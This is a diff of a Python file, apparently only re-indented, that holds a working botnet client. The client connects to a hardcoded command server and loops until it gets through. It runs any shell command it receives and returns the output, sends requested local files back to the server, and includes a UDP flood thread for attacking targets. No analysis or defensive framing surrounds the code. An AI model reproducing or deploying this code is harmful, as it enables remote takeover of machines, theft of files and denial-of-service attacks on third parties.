@@ -12,324 +12,315 @@ logging.basicConfig(level=logging.DEBUG, format="[%(asctime)s] [%(process)s] [%(
 logg = logging.getLogger(__name__)
 
 if os.name == "nt":
-	ENCODING = "windows-1252"
+    ENCODING = "windows-1252"
 else:
-	ENCODING = "utf-8"
+    ENCODING = "utf-8"
 
-MAX_CHUNK_SIZE = 16 * 1024 # 16KB
-POPEN_TIMEOUT = 60 # seconds
+MAX_CHUNK_SIZE = 16 * 1024  # 16KB
+POPEN_TIMEOUT = 60  # seconds
+
 
 class Status:
-	OK = "OK"
-	FAIL = "FAIL"
+    OK = "OK"
+    FAIL = "FAIL"
+
 
 class Request:
-	def __init__(self, send:str="", status:str=Status.OK, body:Union[object, dict]=dict(), header:dict=dict()):
-		self.header = {"status": status}
+    def __init__(self, send: str = "", status: str = Status.OK, body: Union[object, dict] = dict(),
+                 header: dict = dict()):
+        self.header = {"status": status}
 
-		if status == Status.FAIL:
-			self.header["error"] = send
+        if status == Status.FAIL:
+            self.header["error"] = send
 
-		if isinstance(body, dict):
-			self.header["ct"] = "TEXT"
+        if isinstance(body, dict):
+            self.header["ct"] = "TEXT"
 
-			if status == Status.FAIL:
-				self.body = {"output": "", **body}
-			else:
-				self.body = {"output": send, **body}
-		
-		elif isinstance(body, bytes):
-			self.header["ct"] = "BYTES"
-			self.body = body
-		
-		elif isinstance(body, object):
-			self.header["ct"] = "FILE"
-			self.body = body
+            if status == Status.FAIL:
+                self.body = {"output": "", **body}
+            else:
+                self.body = {"output": send, **body}
 
-		self.header = {**self.header, **header}
+        elif isinstance(body, bytes):
+            self.header["ct"] = "BYTES"
+            self.body = body
 
-	
-	def __str__(self):
-		return f"Request(header={self.header}, body={self.body})"
-	
-	def __repr__(self):
-		return self.__str__()
-	
-	def set_header(self, key:str, value:str):
-		self.header[key] = value
-	
-	def get_payload(self, encoding:str="utf-8") -> bytes:
-		return (
-			"\r\n".join(f"{key}: {value}" for key, value in self.header.items())
-			+ "\r\n\r\n"
-			+ "\r\n".join(f"{key}: {value}" for key, value in self.body.items())
-		).encode(encoding)
-	
-	def __iter__(self):
-		yield (
-			"\r\n".join(f"{key}: {value}" for key, value in self.header.items())
-			+ "\r\n\r\n"
-		).encode("utf-8")
+        elif isinstance(body, object):
+            self.header["ct"] = "FILE"
+            self.body = body
 
-		if self.header["ct"] == "TEXT":
-			yield (
-				"\r\n".join(f"{key}: {value}" for key, value in self.body.items())
-			).encode("utf-8")
-		
-		elif self.header["ct"] == "FILE":
-			while data:=self.body.read(MAX_CHUNK_SIZE):
-				yield data
-		
-		elif self.header["ct"] == "BYTES":
-			yield self.body
-		
-		yield b'\x00\x00\xff\xff'
+        self.header = {**self.header, **header}
+
+    def __str__(self):
+        return f"Request(header={self.header}, body={self.body})"
+
+    def __repr__(self):
+        return self.__str__()
+
+    def set_header(self, key: str, value: str):
+        self.header[key] = value
+
+    def get_payload(self, encoding: str = "utf-8") -> bytes:
+        return (
+                "\r\n".join(f"{key}: {value}" for key, value in self.header.items())
+                + "\r\n\r\n"
+                + "\r\n".join(f"{key}: {value}" for key, value in self.body.items())
+        ).encode(encoding)
+
+    def __iter__(self):
+        yield (
+                "\r\n".join(f"{key}: {value}" for key, value in self.header.items())
+                + "\r\n\r\n"
+        ).encode("utf-8")
+
+        if self.header["ct"] == "TEXT":
+            yield (
+                "\r\n".join(f"{key}: {value}" for key, value in self.body.items())
+            ).encode("utf-8")
+
+        elif self.header["ct"] == "FILE":
+            while data := self.body.read(MAX_CHUNK_SIZE):
+                yield data
+
+        elif self.header["ct"] == "BYTES":
+            yield self.body
+
+        yield b'\x00\x00\xff\xff'
+
 
 class Response:
-	def __init__(self, payload:bytes, encoding:str="utf-8") -> None:
-		self.raw_header, self.raw_body = payload.split(b"\r\n\r\n")
-		self.header = {}
-		self.body = {}
+    def __init__(self, payload: bytes, encoding: str = "utf-8") -> None:
+        self.raw_header, self.raw_body = payload.split(b"\r\n\r\n")
+        self.header = {}
+        self.body = {}
 
-		for row in self.raw_header.decode(encoding).split("\r\n"):
-			row_split_list = list(map(lambda x: x.strip(), row.split(":")))
-			self.header[row_split_list[0]] = ":".join(row_split_list[1:]) or None
+        for row in self.raw_header.decode(encoding).split("\r\n"):
+            row_split_list = list(map(lambda x: x.strip(), row.split(":")))
+            self.header[row_split_list[0]] = ":".join(row_split_list[1:]) or None
 
-		for row in self.raw_body.decode(encoding).split("\r\n"):
-			row_split_list = list(map(lambda x: x.strip(), row.split(":")))
-			self.body[row_split_list[0]] = ":".join(row_split_list[1:]) or None
-		
+        for row in self.raw_body.decode(encoding).split("\r\n"):
+            row_split_list = list(map(lambda x: x.strip(), row.split(":")))
+            self.body[row_split_list[0]] = ":".join(row_split_list[1:]) or None
 
-		self._direct = self.header["method"] == "DIRECT"
-		self._connect = self.header["method"] == "CONNECT"
+        self._direct = self.header["method"] == "DIRECT"
+        self._connect = self.header["method"] == "CONNECT"
 
-	def __str__(self):
-		return f"Request(header={self.header}, body={self.body})"
-	
-	def __repr__(self):
-		return self.__str__()
+    def __str__(self):
+        return f"Request(header={self.header}, body={self.body})"
 
-	@property
-	def auth(self):
-		return self.header.get("authorization")
-	
-	@property
-	def cmd(self):
-		return self.body.get("cmd")
+    def __repr__(self):
+        return self.__str__()
 
-	@property
-	def params(self):
-		return self.body.get("params")
+    @property
+    def auth(self):
+        return self.header.get("authorization")
 
-	@property
-	def ack(self):
-		return self.body.get("ack")
+    @property
+    def cmd(self):
+        return self.body.get("cmd")
 
+    @property
+    def params(self):
+        return self.body.get("params")
+
+    @property
+    def ack(self):
+        return self.body.get("ack")
 
 
 class UDPFlood(Thread):
-	def __init__(self, host:str, port:int, timeout:int, total_sent:object, run_until:object=True):
-		super().__init__()
-		self.host = host
-		self.port = port
-		self.timeout = timeout
-		self.run_until = run_until
-		self._closed = False
+    def __init__(self, host: str, port: int, timeout: int, total_sent: object, run_until: object = True):
+        super().__init__()
+        self.host = host
+        self.port = port
+        self.timeout = timeout
+        self.run_until = run_until
+        self._closed = False
 
-		self.total_sent_fn = total_sent
-		self.total_sent = 0
+        self.total_sent_fn = total_sent
+        self.total_sent = 0
 
-		super().__init__()
+        super().__init__()
 
-		self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		self.sock.settimeout(self.timeout)
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.sock.settimeout(self.timeout)
 
-	def message(self):
-		chunk = "A" * 1024 * 2
-		self.total_sent_fn(len(chunk))
-		self.total_sent += (len(chunk))
-		return chunk
+    def message(self):
+        chunk = "A" * 1024 * 2
+        self.total_sent_fn(len(chunk))
+        self.total_sent += (len(chunk))
+        return chunk
 
-	def run(self):
+    def run(self):
+        while self.run_until():
+            self.sock.sendto(self.message().encode(), (self.host, self.port))
+            logg.debug(f"Sent {self.total_sent} bytes to {self.host}:{self.port}")
 
-		while self.run_until():
-			self.sock.sendto(self.message().encode(), (self.host, self.port))
-			logg.debug(f"Sent {self.total_sent} bytes to {self.host}:{self.port}")
+        self.close()
 
-		self.close()
+    def close(self):
+        self._closed = True
+        self.sock.close()
 
-	def close(self):
-		self._closed = True
-		self.sock.close()
 
 class Client():
-	def __init__(self, addr:Tuple[str,int]=("10.64.18.2",8267)) -> None:
-		signal.signal(signal.SIGINT, self.exit_gracefully)
-		signal.signal(signal.SIGTERM, self.exit_gracefully)
-		self.stop = False
-		self.run = False
+    def __init__(self, addr: Tuple[str, int] = ("10.64.18.2", 8267)) -> None:
+        signal.signal(signal.SIGINT, self.exit_gracefully)
+        signal.signal(signal.SIGTERM, self.exit_gracefully)
+        self.stop = False
+        self.run = False
 
+        self.tasks = {}
 
-		self.tasks = {}
+        self.direct = direct = {}
+        for attr, func in inspect.getmembers(self):
+            if attr.startswith("direct_"):
+                direct[attr[7:].upper()] = func
 
-		self.direct = direct = {}
-		for attr, func in inspect.getmembers(self):
-			if attr.startswith("direct_"):
-				direct[attr[7:].upper()] = func
-		
-		self.connect = connect = {}
-		for attr, func in inspect.getmembers(self):
-			if attr.startswith("connect_"):
-				connect[attr[8:].upper()] = func
+        self.connect = connect = {}
+        for attr, func in inspect.getmembers(self):
+            if attr.startswith("connect_"):
+                connect[attr[8:].upper()] = func
 
+        while not self.stop:
+            try:
+                self._connect(addr)
+            except KeyboardInterrupt:
+                continue
+            except Exception as ex:
+                # trace = []
+                # tb = ex.__traceback__
+                # while tb is not None:
+                # 	trace.append({
+                # 		"filename": tb.tb_frame.f_code.co_filename,
+                # 		"name": tb.tb_frame.f_code.co_name,
+                # 		"lineno": tb.tb_lineno
+                # 	})
+                # 	tb = tb.tb_next
+                # print(str({
+                # 	'type': type(ex).__name__,
+                # 	'message': str(ex)
+                # }))
 
-		while not self.stop:
-			try:
-				self._connect(addr)
-			except KeyboardInterrupt:
-				continue
-			except Exception as ex:
-				# trace = []
-				# tb = ex.__traceback__
-				# while tb is not None:
-				# 	trace.append({
-				# 		"filename": tb.tb_frame.f_code.co_filename,
-				# 		"name": tb.tb_frame.f_code.co_name,
-				# 		"lineno": tb.tb_lineno
-				# 	})
-				# 	tb = tb.tb_next
-				# print(str({
-				# 	'type': type(ex).__name__,
-				# 	'message': str(ex)
-				# }))
+                # for n in trace:
+                # 	print(n)
 
-				# for n in trace:
-				# 	print(n)
+                print(f"Error connecting {addr}| Sleep 1 seconds")
+                sleep(1)
 
-				print(f"Error connecting {addr}| Sleep 1 seconds")
-				sleep(1)
+    # self._connect(addr)
+    # input("Press enter to exit")
 
+    def exit_gracefully(self, signum, frame):
+        print("\nExiting....")
+        self.stop = True
+        self.run = False
+        self.conn.close()
+        sleep(1)
+        sys.exit(0)
 
-		# self._connect(addr)
-		# input("Press enter to exit")
+    def _connect(self, connect: Tuple[str, int]) -> None:
+        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.conn.connect(connect)
+        self.start()
 
+    def send(self, req: Request) -> None:
+        for payload in req:
+            self.conn.send(payload)
 
+    def recv(self) -> Response:
+        data = self.conn.recv(MAX_CHUNK_SIZE)
+        if not data:
+            return None
 
-	def exit_gracefully(self, signum, frame):
-		print("\nExiting....")
-		self.stop = True
-		self.run = False
-		self.conn.close()
-		sleep(1)
-		sys.exit(0)
+        res = Response(data)
 
-	def _connect(self, connect:Tuple[str,int]) -> None:
-		self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.conn.connect(connect)
-		self.start()
+        return res
 
-	def send(self, req:Request) -> None:
-		for payload in req:
-			self.conn.send(payload)
+    def start(self) -> None:
+        while True:
+            response = self.recv()
 
+            cmd = response.cmd
+            ack = response.cmd
+            params = response.params.split(" ") if response.params else response.params
 
-	def recv(self) -> Response:
-		data = self.conn.recv(MAX_CHUNK_SIZE)
-		if not data:
-			return None
+            if response._direct:
+                self.method_direct(cmd, ack, params)
 
-		res = Response(data)
+            elif response._connect:
+                self.method_connect(cmd, ack, params)
 
-		return res
+            else:
+                print("Invalid command")
 
-	def start(self) -> None:
-		while True:
-			response = self.recv()
+    def method_direct(self, cmd: str, ack: str, params: str) -> None:
+        if cmd in self.direct:
+            self.direct[cmd](ack, params)
+        else:
+            print("Invalid command")
 
-			cmd = response.cmd
-			ack = response.cmd
-			params = response.params.split(" ") if response.params else response.params
+    def direct_ping(self, ack: str, params: str) -> None:
+        if ack:
+            self.send(Request("Pong"))
 
-			if response._direct:
-				self.method_direct(cmd, ack, params)
-			
-			elif response._connect:
-				self.method_connect(cmd, ack, params)
+    def direct_destroy(self, ack: str, params: str) -> None:
+        for hash in self.tasks:
+            self.tasks[hash]["manager"].run_until_local = False
+        if ack:
+            self.send(Request("Shutting down"))
 
-			else:
-				print("Invalid command")
-	
+        self.exit_gracefully(None, None)
 
-	def method_direct(self, cmd:str, ack:str, params:str) -> None:
-		if cmd in self.direct:
-			self.direct[cmd](ack, params)
-		else:
-			print("Invalid command")
-	
-	def direct_ping(self, ack:str, params:str) -> None:
-		if ack:
-			self.send(Request("Pong"))
+    def method_connect(self, cmd: str, ack: str, params: str) -> None:
+        if cmd in self.connect:
+            self.connect[cmd](ack, params)
+        else:
+            self.send(Request("Invalid command"))
 
-	def direct_destroy(self, ack:str, params:str) -> None:
-		for hash in self.tasks:
-			self.tasks[hash]["manager"].run_until_local = False
-		if ack:
-			self.send(Request("Shutting down"))
-		
-		self.exit_gracefully(None, None)
+    def connect_shell(self, ack: str, params: str) -> None:
+        output = self.popen(cmd=params)
+        if ack:
+            self.send(Request(body=output))
 
-	def method_connect(self, cmd:str, ack:str, params:str) -> None:
-		if cmd in self.connect:
-			self.connect[cmd](ack, params)
-		else:
-			self.send(Request("Invalid command"))
-	
-	def connect_shell(self, ack:str, params:str) -> None:
-		output = self.popen(cmd=params)
-		if ack:
-			self.send(Request(body=output))
+    def connect_download(self, ack: str, params: str) -> None:
+        file = params[0]
+        if os.path.exists(file):
+            with open(file, "rb") as fp:
+                self.send(Request(body=fp))
+                return
 
-	def connect_download(self, ack:str, params:str) -> None:
-		file = params[0]
-		if os.path.exists(file):
-			with open(file, "rb") as fp:
-				self.send(Request(body=fp))
-				return
+        self.send(Request(f"File {file} Not found.", status=Status.FAIL))
 
-		self.send(Request(f"File {file} Not found.", status=Status.FAIL))
+    def popen(self, cmd: list) -> str:
+        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                                   shell=True)
+        timer = Timer(POPEN_TIMEOUT, process.terminate)
+        try:
+            timer.start()
+            stdout, stderr = process.communicate()
+            output = stdout or stderr
+        finally:
+            timer.cancel()
 
-	
+        final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
+        return final_output
 
-	def popen(self, cmd: list) -> str:
-		process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-		timer = Timer(POPEN_TIMEOUT, process.terminate)
-		try:
-			timer.start()
-			stdout, stderr = process.communicate()
-			output = stdout or stderr
-		finally:
-			timer.cancel()
+    def get_hash(self, *args):
+        data = []
+        if len(args) > 1:
+            for n in args:
+                if isinstance(n, str):
+                    data.append(n)
 
-		final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
-		return final_output
+                if isinstance(n, (tuple, list, set)):
+                    data += [*list(n)]
+        else:
+            data = args
 
-	def get_hash(self, *args):
-		data = []
-		if len(args) > 1:
-			for n in args:
-				if isinstance(n, str):
-					data.append(n)
-
-				if isinstance(n, (tuple, list, set)):
-					data += [*list(n)]
-		else:
-			data = args
-
-		he = hashlib.md5(str(data).encode()).hexdigest()
-		return (int(he, 16) % (1<<32))
-
-
+        he = hashlib.md5(str(data).encode()).hexdigest()
+        return (int(he, 16) % (1 << 32))
 
 
 if __name__ == "__main__":
-	Client()
+    Client()
